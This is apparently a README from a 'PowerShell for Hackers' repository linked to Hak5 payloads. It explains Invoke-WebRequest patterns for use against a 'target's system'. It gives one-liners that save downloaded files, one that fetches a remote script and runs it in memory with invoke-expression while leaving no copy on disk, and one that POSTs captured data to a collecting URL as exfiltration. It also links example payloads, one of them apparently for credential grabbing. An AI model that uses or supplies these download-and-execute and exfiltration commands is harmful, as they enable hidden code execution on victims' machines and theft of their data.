![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#The-Function">The Function</a></li>
    <li><a href="#Examples">Examples</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

Appreciate [UberGuidoZ](https://github.com/UberGuidoZ) for contributing to this function.

# Invoke-WebRequest

## Description

These functions are used to either download or upload files or data

## The Function

### [IWR-Save] 

This formatting of the IWR function will download a file from a selected URL and save it to the directory of your choosing 

This is helpful if you are trying to save an image or sound file to use in your script

------------------------------------------------------------------------------------------------------------------------------

$env:TMP\   

Use this environment variable to save the file to your Temp directory

$Env:USERPROFILE\Desktop\    

Use this environment variable to save a file to your desktop

```
iwr < Your url for the intended file>?dl=1 -O $env:TMP\image.jpg
```

### [IWR-Execute] 

This formatting of the IWR function will download a file and execute it immedietely without saving it to memory

This is helpful if you are trying to download and execute a script without keeping it on the target's system

```
$pl = iwr < Your url for the intended file>?dl=1; invoke-expression $pl
```

### [IWR-Post] 

This formatting of the IWR function will exfiltrate data via a DNS/POST

This is helpful if you are trying to exfiltrate the data you have captured

[Request Catcher](https://requestcatcher.com/)<-------Helpful website to test POST requests

```
Invoke-WebRequest -Uri < Your url for recieving the intended file> -Method POST -Body "text to upload"
```

<p align="right">(<a href="#top">back to top</a>)</p>


## Examples 

Listed below are payloads that have used one of these functions:

[Acid Burn](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-AcidBurn)

[JumpScare](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-JumpScare)

[WallPaper-Troll](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-Wallpaper-Troll)

[Credz-Plz](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-Credz-Plz)

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<div><h2>I am Jakoby</h2></div>
  <p><br/>
  
  <img src="https://media.giphy.com/media/VgCDAzcKvsR6OM0uWg/giphy.gif" width="50"> 
  
  <a href="https://github.com/I-Am-Jakoby/">
    <img src="https://img.shields.io/badge/GitHub-I--Am--Jakoby-blue">
  </a>
  
  <a href="https://www.instagram.com/i_am_jakoby/">
    <img src="https://img.shields.io/badge/Instagram-i__am__jakoby-red">
  </a>
  
  <a href="https://twitter.com/I_Am_Jakoby/">
    <img src="https://img.shields.io/badge/Twitter-I__Am__Jakoby-blue">
  </a>
  
  <a href="https://www.youtube.com/c/IamJakoby/">
    <img src="https://img.shields.io/badge/YouTube-I_am_Jakoby-red">
  </a>

</p>



<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [UberGuidoZ](https://github.com/UberGuidoZ)

***

[HOME-PAGE](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers)

<p align="right">(<a href="#top">back to top</a>)</p>
